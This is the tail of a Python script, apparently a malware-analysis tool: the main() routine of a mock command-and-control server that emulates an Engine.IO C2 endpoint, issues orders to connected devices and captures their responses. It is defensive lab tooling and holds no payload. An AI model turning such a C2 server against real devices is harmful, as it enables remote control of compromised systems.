    parser = argparse.ArgumentParser(description="Mock C2 test client (analysis only)")
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--port", type=int, default=42474)
    parser.add_argument("--ping", type=int, default=10,
                        help="app-level 'ping' event interval in seconds")
    parser.add_argument("--no-heartbeat", action="store_true")
    parser.add_argument("--out", default="c2_out",
                        help="directory for captured responses (default c2_out)")
    args = parser.parse_args()

    c2 = C2Server()
    c2.saver = ResponseSaver(args.out)
    Handler.c2 = c2

    httpd = ThreadingHTTPServer((args.host, args.port), Handler)
    threading.Thread(target=httpd.serve_forever, daemon=True).start()
    threading.Thread(target=c2.monitor, daemon=True).start()
    if not args.no_heartbeat:
        threading.Thread(target=c2.app_heartbeat, args=(args.ping,), daemon=True).start()

    log("mock C2 listening on %s:%s  (Engine.IO v4 polling)" % (args.host, args.port))
    log("dashboard: http://%s:%d/   api: /api/devices /api/order /api/log /api/files" % (args.host, args.port))
    log("responses captured to: %s" % os.path.abspath(args.out))
    log("config template: GET /api/config-template or tools/c2_config.template.json")
    ips = local_ips()
    if ips:
        log("if not using the runtime config, point SOCKET_URL at one of: %s  (emulator host alias: http://10.0.2.2:42474)" %
            ", ".join("http://%s:%d" % (ip, args.port) for ip in ips))
    log("'help' for orders, 'quit' to stop.")

    try:
        console_loop(c2)
    except KeyboardInterrupt:
        pass
    finally:
        httpd.shutdown()
        log("server stopped")


if __name__ == "__main__":
    main()
